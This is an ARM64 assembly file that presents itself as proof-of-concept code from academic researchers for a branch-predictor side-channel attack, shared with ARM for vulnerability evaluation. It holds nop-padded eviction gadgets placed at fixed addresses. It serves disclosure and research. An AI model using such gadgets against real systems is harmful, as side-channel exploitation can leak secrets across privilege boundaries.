/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

.text
// Well, I don't know how to request a memory block at a given VA in kernel space, so at this moment they are pre-compiled.

.altmacro
.macro NOP_PADDING val
    .rept \val
        nop
    .endr
.endm

.altmacro
.macro NOP_PADDING_BYTES val
    NOP_PADDING \val>>2
.endm

.global biasscope_evict_2000
.global biasscope_evict_2080
.global biasscope_evict_2180
.global biasscope_evict_21c0
.global biasscope_evict_2200
.global biasscope_evict_2280
.global biasscope_evict_2340
.global biasscope_evict_2380

.global biasscope_evict_base
biasscope_evict_base:

.align 16
    NOP_PADDING_BYTES 0x1ff4
biasscope_evict_2000:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2000_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2010

NOP_PADDING_BYTES 0x60

biasscope_evict_2080:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2080_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2090

NOP_PADDING_BYTES 0xe0

biasscope_evict_2180:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2180_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2190


NOP_PADDING_BYTES 0x20

biasscope_evict_21c0:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_21c0_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x21d0


NOP_PADDING_BYTES 0x20

biasscope_evict_2200:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2200_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2210


NOP_PADDING_BYTES 0x60

biasscope_evict_2280:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2280_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2290


NOP_PADDING_BYTES 0xa0

biasscope_evict_2340:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2340_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2350

NOP_PADDING_BYTES 0x20

biasscope_evict_2380:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2
.align 6
biasscope_evict_2380_bcond:
    b.ne #12
    nop
    nop
    nop
    ret // 0x2390
